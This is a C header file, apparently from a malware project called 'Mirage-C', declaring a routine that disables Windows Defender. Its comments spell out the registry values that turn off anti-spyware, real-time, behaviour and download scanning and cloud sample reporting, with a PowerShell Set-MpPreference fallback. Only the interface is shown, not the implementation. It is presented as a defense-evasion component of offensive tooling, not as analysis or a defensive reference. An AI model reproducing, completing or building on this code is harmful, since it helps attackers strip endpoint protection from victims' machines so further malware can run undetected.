/*
 * defender_disable.h — Windows Defender disabling for Mirage-C
 *
 * Disables Windows Defender via registry keys and PowerShell commands.
 * Sets DisableAntiSpyware, DisableRealtimeMonitoring, and related
 * DWORD values under the Windows Defender registry paths.
 */

#ifndef MIRAGE_DEFENDER_DISABLE_H
#define MIRAGE_DEFENDER_DISABLE_H

#ifdef __cplusplus
extern "C" {
#endif

/* ── Disable result codes ─────────────────────────────────── */
typedef enum {
    MIRAGE_DEFENDER_SUCCESS = 0,   /* All registry keys set */
    MIRAGE_DEFENDER_PARTIAL = 1,   /* Some keys set, others failed */
    MIRAGE_DEFENDER_FAILED  = 3    /* All attempts failed */
} mirage_defender_result;

/*
 * mirage_disable_defender — Disable Windows Defender.
 *
 * Sets the following DWORD registry values:
 *   HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware = 1
 *   HKLM\...\Real-Time Protection\DisableRealtimeMonitoring = 1
 *   HKLM\...\Real-Time Protection\DisableBehaviorMonitoring = 1
 *   HKLM\...\Real-Time Protection\DisableIOAVProtection = 1
 *   HKLM\...\Real-Time Protection\DisableScanOnRealtimeEnable = 1
 *   HKLM\...\SpyNet\SubmitSamplesConsent = 2
 *   HKLM\...\SpyNet\SpynetReporting = 0
 *
 * Falls back to PowerShell Set-MpPreference if registry fails.
 *
 * Returns MIRAGE_DEFENDER_SUCCESS, MIRAGE_DEFENDER_PARTIAL,
 * or MIRAGE_DEFENDER_FAILED.
 */
mirage_defender_result mirage_disable_defender(void);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_DEFENDER_DISABLE_H */
